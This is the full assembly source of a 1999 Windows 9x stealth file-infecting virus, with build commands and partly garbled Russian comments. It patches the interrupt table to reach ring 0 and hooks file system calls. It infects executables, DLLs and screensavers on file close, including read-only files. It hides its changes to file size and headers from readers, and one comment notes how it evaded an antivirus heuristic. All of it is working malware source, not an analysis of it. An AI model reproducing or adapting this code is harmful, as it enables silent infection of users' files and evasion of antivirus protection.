   ; Tue 09 Nov 23:06:58 1999

   ; tasm32 /ml /m2 /z stealth
   ; tlink32 /Tpe /aa /c /x stealth,,, import32.lib
   ; à §¬¥à ª®¤  ¢¨à  - à®¢® 1Kb,   áâ®«ìª® ¦¥
   ; ã¢¥«¨ç¨¢ îâáï § à ¦¥ë¥ ä ©«ë

   ; ---------------------------------------------------------------------
   ; ¯ àã á«®¢ ®¡ AV: ¡ áâ à¤ DrWeb àã£ «áï   cmp word ptr [edx], 'ZM'
   ; ¯®á«¥ § ¬¥ë   mov cx, 'ZM'; cmp word ptr [edx],cx ® § âªã«áï!
   ; å®âï ª®£¤  áâ¥«á-à¥§¨¤¥â ãáâ ®¢«¥, ® ¢®®¡é¥ ¨ç¥£® ¥ ¢¨¤¨â
   ; ---------------------------------------------------------------------

                   ; THIS SHIT _CAN_ CORRECTLY INFECT DLL FILES AND SOME MORE STUFF
                   ; (CPL, AWX, PKG, SCR, etc...), MOREOVER, IT CAN INFECT
                   ; FILES, OPENED FOR READ-ONLY AND LOCKED FILES
   .386p
   .model flat, stdcall
   include win.inc
   intno   equ 5
   .code
   .data
   start:
   install:
           pushad
           call _nxt
   _nxt:   pop ebp
           sub ebp,offset _nxt
   ; set SEH
           lea eax,[ebp+SEHproc]
           push eax
           xor ebx,ebx
           lea ecx,[esp-4]
           xchg ecx,fs:[ebx]
           push ecx
   ; start of SEH protected section
           cli
           push ecx
           sidt [esp-02h]
           pop ebx
           mov eax,[ebx+4+8*intno]
           mov ax,[ebx+8*intno]
           lea ecx,[ebp+ring0setup]
           mov [ebx+8*intno],cx
           shr ecx,16
           mov [ebx+6+8*intno],cx
           int intno
           sti
   ; end of protected section
           jmp short SEHok
   ; exception handler
   SEHproc:xor ebx,ebx
           mov eax,fs:[ebx]
           mov esp,[eax]
   ; Restore old SEH
   SEHok:  xor ebx,ebx
           pop dword ptr fs:[ebx]
           pop eax
   ; return to host
           popad
           push offset _exitprocess
   hostentry equ $-4
           ret
   ring0setup:
                           ; restore exception descriptor
           mov [ebx+8*intno],ax
           shr eax,16
           mov [ebx+6+8*intno],ax

           mov eax, 20CDh                ; restore vmm calls, plus anti-heuristic
           lea edi, [ebp+vmm1]
           mov [edi], eax
           mov [edi+vmm2-vmm1], eax
           mov dword ptr [edi+2], _PageAllocate
           mov dword ptr [edi+vmm2-vmm1+2], IFSMgr_InstallFileSystemApiHook

                           ; allocate memory
           xor eax,eax
           push PAGEUSEALIGN or PAGEZEROINIT or PAGEFIXED or PAGECONTIG
           push eax
           push 0FFFFFFFFh
           push eax eax eax
           push PG_SYS
           push (virsize-1)/4096+1
   vmm1:   db 6 dup (90h)
           ; vmm _PageAllocate
           add esp,4*8
                           ; copy code to system area
           mov edi,edx
           lea esi,[ebp+start]
           mov ecx,(vircode-1)/4+1
           rep movsd
                           ; install file system API hook
           add edx,ifshook-start
           push edx
   vmm2:   db 6 dup (90h)
           ; vmm IFSMgr_InstallFileSystemApiHook
           pop edx
           mov [edx+prevhook-ifshook],eax
           xor eax,eax
           mov [edx+busy-ifshook], al
           mov [edx+readFSD-ifshook], eax
           mov [edx+writeFSD-ifshook], eax
           iretd
   ; ---------------------------------------------------------
   ;   stealthed file:
   ;               /-------------------------------\
   ;           0h: | MZ....                        |
   ;               | ......                        |
   ;          20h: | signature 'dark'              | <- old good signature :)))
   ;          24h: | original filesize             |
   ;          28h: | address of section object     |
   ;          2Ch: | original entrypoint           |
   ;          30h: | ---- reserved ----            |
   ;          34h: | original imagesize            |
   ;          38h: | original number of sections   |
   ;          3Ch: | as usual - offset to PE header|
   ;               | ...                           |
   ;               | ...                           |
   ;original size: |-------------------------------|
   ;               | virus code                    |
   ;               \-------------------------------/

   ifshook:pushad
           lea ebp,[esp+4*8+4]
           call _nxt1
   _nxt1:  pop edi
           sub edi, offset _nxt1
           mov eax, [ebp.IFSfn]
           mov ebx, [ebp.ioreq]
                           ; prevent reentering
           bts dword ptr [edi+busy], 0
           jc exithook
           mov ecx, [ebp.FSDfn]
           cmp al, IFSFN_FINDNEXT
           jnz short noFIND
   ; ---- find next ---------------------------------
           call callprev
                           ; change file length in
                           ; FindFile function
           mov ebx, [ebx.IR_DATA]
           add ebx, 20h
           mov eax, [ebx]
           cmp eax, 100h+physsize
           jbe short wrong_len
           cmp al, 06h
           jnz short wrong_len
   ;        call chkinfect         ; maybe later
   ;        jz short wrong_len
           sub dword ptr [ebx], physsize+6
   wrong_len:
           jmp short cancel1

   noFIND: test al,al ; cmp al, IFSFN_READ
           jnz noRead
   ; ----- read file ---------------------------------
           mov [edi+readFSD], ecx
           mov eax, ecx
           call FSDbeg     ; read start of file
           mov cx,'ZM'
           cmp word ptr [edx], cx ; executables only
           jnz short ___1
           cmp [edx+sign-filedata], 'dark'                  ; and only infected
   ___1:   jnz hookdone
                           ; hide new size
           mov ecx, [edx+orgsize-filedata]
           cmp ecx, [ebx.IR_POS]
           jae short not_abovefile
                           ; read is out of original file, fail
           xor edx, edx
           mov [ebx.IR_LENGTH], edx
   cancel1:
           jmp cancel2
   not_abovefile:
           mov eax, [ebx.IR_LENGTH]
           add eax, [ebx.IR_POS]
           cmp eax, ecx
           jbe short size_is_ok
                           ; read request is partially out of original file,
                           ; decrease length of read area
           mov eax, ecx
           sub eax, [ebx.IR_POS]
           mov [ebx.IR_LENGTH], eax
   size_is_ok:
           mov esi, [ebx.IR_POS]   ; esi = read position
           mov eax, [ebx.IR_DATA]
           mov [edi+data], eax     ; [data] = address of read buffer

           call callprev   ; read file

           mov ecx, esi
           add ecx, [ebx.IR_LENGTH] ; ecx = end of read block

                           ; stealth routines
           lea ebx, [edi+orgimg]
           mov edx, [edi+PEheadr]
           push edx
           add edx, 50h
           mov al, 4
           call HideArea   ; hide imagesize

           lea ebx, [edi+orgentr]
           pop edx
           push edx
           add edx, 28h
           mov al, 4
           call HideArea   ; hide entrypoint

           pop edx
           lea ebx, [edi+numsec]
           add edx, 6
           mov al, 2
           call HideArea   ; hide amount of sections

           lea ebx, [edi+zerosp]
           mov edx, [edi+sectloc]
                           ; clear zero buffer
           push 40h
           pop eax
   clear:  mov [ebx+eax-1], ah
           dec al
           jnz short clear

           mov al, 28h
           push ebx
           call HideArea   ; hide virus section object
           pop ebx
           push 20h
           pop edx         ; virus data
           mov al, 1Ch
           call HideArea   ; hide infection data
   cancel2:jmp cancel
   ; --------------------------------------------------
   noRead: cmp al, IFSFN_CLOSE
           jnz noClose
                           ; we will infect files on close,
                           ; so if user will try to copy files,
                           ; first we will cure it on read and spoil again
                           ; when copy is done
           mov eax, [edi+readFSD]
           test eax, eax
           jz short zdone
           mov esi, [edi+writeFSD]
           test esi, esi
   zdone:  jz hookdone
                           ; make sure that IO request is valid,
                           ; without this check we may try to read from
                           ; non-existing file and hang system
           cmp [ebx+0Ch], 0FFFFFBBBh
           jnz short nzdone
                           ; first of all read start of file
                           ; to make sure that it is pe-exe
           call FSDbeg
           mov cx, 'ZM'
           cmp word ptr [edx], cx
           jnz short nzdone

                           ; not-stealthed area, checking for infection
                           ; (debug only)
   ;        mov dword ptr [edx], 'YYZM'

           push 1Ch
           pop ecx
   test1:  cmp [edx+1fh+ecx], ch
           jnz short nzdone        ; place for storing data is busy
                                   ; -> possibly already infected
           loop test1
           mov esi, [edx+3ch]
           add edx, pehdr-filedata
           inc ch
           call FSD                ; read PE header
           movzx edx, word ptr [edx+6] ; number of sections
           lea edx, [edx*8]
           lea edx, [edx*4+edx+0F8h]    ; num*28h+sizeof(PEheader)
           add esi, edx            ; location of last section
           push 28h
           pop ecx
           lea edx, [edi+section]
           call FSD
           dec edx
   testsec:cmp [edx+ecx], ch
           jnz short nzdone        ; exit if there is a data after last section
           loop testsec

           mov [edi+sectloc], esi

           mov ecx, [edi+req2+IR_FH] ; get file handle
           mov esi, [ecx]
           mov esi, [esi+30h]      ; get original filesize
           test esi,1FFh
   nzdone: jnz hookdone            ; file is misaligned or contains overlay
           mov [edi+orgsize], esi  ; store original filesize

           or byte ptr [ecx+0Ch], 3; enable writing to file opened for read only
                                   ; create section
           mov ecx, virtsize
           inc edx
           mov [edx+8], ecx            ; virtual size
           mov eax, [edi+pehdr+50h]
           mov [edx+0Ch], eax          ; section RVA
           mov [edi+orgimg], eax
           add [edi+pehdr+50h], ecx
           mov dword ptr [edx+10h], physsize      ; phys. size
           mov [edx+14h], esi          ; location of section in file
           mov dword ptr [edx+24h], 60000020h    ; usual code section

           xchg eax, [edi+pehdr+28h]     ; fix entry point
           mov [edi+orgentr], eax
           add eax, [edi+pehdr+34h]      ; entry RVA => entry VA
           mov dword ptr [edi+hostentry], eax

           mov eax, [edi+pehdr+6]        ; fix number of sections
           mov [edi+numsec], eax
           inc dword ptr [edi+pehdr+6]

           push edx
           mov ecx, physsize+6      ; +6 -> infection flag
           lea edx, [edi+start]
           mov eax, [edi+writeFSD]
           call FSD                        ; write virus code
           pop edx

           push 28h
           pop ecx
           mov esi, [edi+sectloc]
           call FSD                        ; write new section

           push 100h
           pop ecx
           mov esi, [edi+PEheadr]
           lea edx, [edi+pehdr]
           call FSD                        ; write PE-header

           mov [edi+sign], 'dark'
           call FSDbeg                     ; write infection data

           jmp short hookdone
   ; ----------------------------------------------------
   noClose:cmp al, IFSFN_WRITE
           jnz short noWrite
                                   ; find out FileWrite API
           mov [edi+writeFSD], ecx
           jmp short hookdone
   noWrite:cmp al, IFSFN_SEEK
           jnz short noSeek
                                   ; fix filesize on seek to end
           call callprev
           mov ecx, [ebx.IR_POS]
           cmp ecx, physsize+100h
           jbe short cancel
           cmp cl, 6
           jnz short cancel
           sub dword ptr [ebx.IR_POS], physsize+6
           jmp short cancel
   noSeek:
                           ; spy for more events ?
   hookdone:
           dec [edi+busy]
   exithook:
           popad
   prev:   jmp dword ptr ds:[12345678h]
   prevhook equ $-4
   cancel: dec [edi+busy]
           popad
           xor eax, eax
           ret

   ; ---------------------------------------------------------
   ; hide part of file
   ; input: edx   = start of area in file
   ;        ebx   = start of mem area with original data
   ;        al    = size of area
   HideArea:
           mov byte ptr [edi+len], al
   _hideloop:
           mov al, [ebx]
   ; ---------------------------------------------------------
   ; Hide one byte
   ; input: edx = byte position in file
   ;        esi = start of read area
   ;        ecx = end of read area
   ;        al  = original byte value
   HideByte:
           cmp edx, esi
           jb short nohide
           cmp edx, ecx
           jae short nohide
           push edx
                   ; find offset in memory to patch byte
           sub edx, esi
           add edx, [edi+data]
           mov [edx], al
           pop edx
   nohide:
   ; ---------------------------------------------------------
           inc edx
           inc ebx
           dec byte ptr [edi+len]
           jnz short _hideloop
           ret
   ; ---------------------------------------------------------
   ; call previous IFS API handler
   callprev:
           pushad
           push [ebp.ioreq]
           push [ebp.codepage]
           push [ebp.flags]
           push [ebp.drive]
           push [ebp.IFSfn]
           push [ebp.FSDfn]
           call prev
           add esp, 6*4
           popad
           ret
   ; ---------------------------------------------------------
   ; read start of file
   FSDbeg: push 40h
           pop ecx
           xor esi, esi
           lea edx, [edi+filedata]
   ; in:  ebx - old request data
   ;      ecx - size
   ;      esi - offset in file
   ;      edx - address in memory
   ;      eax - fsd function address
   FSD:    pushad
           push eax
           lea eax, [edi+req2]
           mov [eax.IR_LENGTH], ecx
   ;        mov ecx, dword ptr [ebx.IR_FLAGS]
   ;        mov dword ptr [eax.IR_FLAGS], ecx
           mov ecx, [ebx.IR_RH]
           mov [eax.IR_RH], ecx
           mov ecx, [ebx.IR_FH]
           mov [eax.IR_FH], ecx
           mov [eax.IR_POS], esi
           mov [eax.IR_DATA], edx
           pop ecx
           push eax
           call ecx
           pop eax
           popad
           ret
   ; ---------------------------------------------------------
           align 10h
           db 'Craddle of Filth'
   vircode equ $-start     ; size of virus code
   physsize equ ((vircode-1)/512+1)*512 ; size of virus in file
   virtsize equ ((vircode-1)/4096+1)*4096 ; size of virus, aligned to section
   ; -- data -------------------------------------------------
   busy    db 0
   len     db ?
   data    dd ?
   readFSD dd 0
   writeFSD dd 0
   ; ---------------------------------------------------------
   filedata        label   ; 40h bytes
   waste   db 20h dup (?)
   sign    dd 'dark'
   orgsize dd ?
   sectloc dd ?
   orgentr dd ?
   reservd dd ?
   orgimg  dd ?
   numsec  dd ?
   PEheadr dd ?
   ; ---------------------------------------------------------
   req2    dd 80h/4 dup (?)
   pehdr   dd 100h/4 dup (?)
   ; ---------------------------------------------------------
   section label
   zerosp  dd 40h/4 dup (?)
   ; ---------------------------------------------------------
   virsize equ $-start     ; size of virus in memory
   ; ---------------------------------------------------------
           extern ExitProcess:PROC
   _exitprocess:
           call ExitProcess,0

           end install
